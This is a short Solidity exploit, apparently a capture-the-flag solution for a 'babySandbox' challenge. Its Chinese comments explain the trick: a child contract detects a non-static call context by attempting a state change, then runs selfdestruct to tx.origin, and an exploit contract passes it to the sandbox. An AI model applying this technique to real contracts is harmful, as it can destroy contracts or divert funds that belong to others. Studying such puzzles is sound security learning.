import "./Setup.sol";

contract Child {
    Child private immutable self = this;
    uint8 flag = 1;

    //试图修改状态，判断是否在staticcall环境中
    function check() external {
        flag += 1;
    }

    fallback() external payable {
        //如果修改状态成功，则说明不在staticcall环境中，可以进行selfdestruct
        try self.check() {
            selfdestruct(tx.origin);
        } catch {}
        //由于staticcall环境中不能修改状态，因此以下方法不能实现
//        bool flag = false;
//        if(flag) {
//            selfdestruct(tx.origin);
//        }else{
//            flag = true;
//        }
    }
}

contract babySandboxExploit {
    constructor(babySandboxSetup setup) {
        setup.sandbox().run(address(new Child()));
    }
}
